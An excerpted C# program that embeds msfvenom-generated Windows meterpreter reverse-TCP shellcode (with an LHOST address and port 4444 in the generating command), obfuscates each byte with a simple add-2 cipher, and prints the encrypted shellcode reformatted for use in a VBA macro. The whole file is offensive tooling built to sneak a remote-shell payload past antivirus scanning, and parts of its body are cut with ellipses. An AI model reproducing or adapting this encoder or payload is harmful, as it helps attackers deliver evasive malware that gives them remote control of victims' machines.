...
namespace Helper
{
    internal class Program
    {
        ...
        {
            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.86.130 LPORT=4444 -f csharp 
...
0xc0,0xa8,0x56,0x82,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
...
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
            ...
            {
                encrypted[i] = (byte)(((uint)buf[i] + 2) & 0xFF);

            }
            StringBuilder hex = new StringBuilder(encrypted.Length * 2);
            uint counter = 0;
            //output reformatting for vba consumption 
            ...
            Console.WriteLine("The encrypted shellcode is: " + hex.ToString());
